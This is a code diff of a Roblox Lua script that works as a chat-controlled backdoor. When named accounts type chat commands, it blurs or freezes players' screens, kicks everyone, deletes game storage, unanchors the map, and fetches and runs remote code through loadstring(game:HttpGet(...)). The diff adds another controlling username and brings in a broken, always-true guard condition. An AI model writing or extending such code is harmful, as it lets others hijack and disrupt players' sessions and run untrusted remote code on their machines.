@@ -7,7 +7,7 @@ local commands = {
         end
     end,
     void = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             local character = game.Players.LocalPlayer.Character
             local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
             local newPosition = humanoidRootPart.CFrame
@@ -19,13 +19,13 @@ local commands = {
         end
     end,
     blind = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             local blur = Instance.new("BlurEffect", game.Lighting)
             blur.Size = 10000000000000
         end
     end,
     unblind = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
             if blur then
                 blur:Destroy()
@@ -33,12 +33,12 @@ local commands = {
         end
     end,
     trollage = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage.lua"))()
         end
     end,
     crash = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             wait(1)
             for index, player in pairs(game.Players:GetPlayers()) do
                 player:Kick("Snoopy Owns You")
@@ -46,7 +46,7 @@ local commands = {
         end
     end,
     freeze = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             local player = game.Players.LocalPlayer
             local character = player.Character or player.CharacterAdded:Wait()
             local humanoid = character:WaitForChild("Humanoid")
@@ -60,7 +60,7 @@ local commands = {
         end
     end,
     unfreeze = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             local player = game.Players.LocalPlayer
             local character = player.Character or player.CharacterAdded:Wait()
             local humanoid = character:WaitForChild("Humanoid")
@@ -74,7 +74,7 @@ local commands = {
         end
     end,
     breakgame = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             pcall(function()
                 local replicatedStorage = game:GetService("ReplicatedStorage")
                 for _, child in ipairs(replicatedStorage:GetDescendants()) do
@@ -84,7 +84,7 @@ local commands = {
         end
     end,
     funnymap = function()
-        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
+        if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             local function unanchorParts(object)
                 if object:IsA("BasePart") then
                     object.Anchored = false
@@ -102,7 +102,7 @@ textChatService.OnIncomingMessage = function(message)
     local properties = Instance.new("TextChatMessageProperties")
     if message.TextSource then
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-        if player.Name == "SnoopyIs_Better" or player.Name == "menamge0" then
+        if player.Name == "SnoopyIs_Better" or player.Name == "menamge0" or player.Name == "mrbeatyouruglyface" then
             local command = commands[message.Text]
             if command then
                 command()
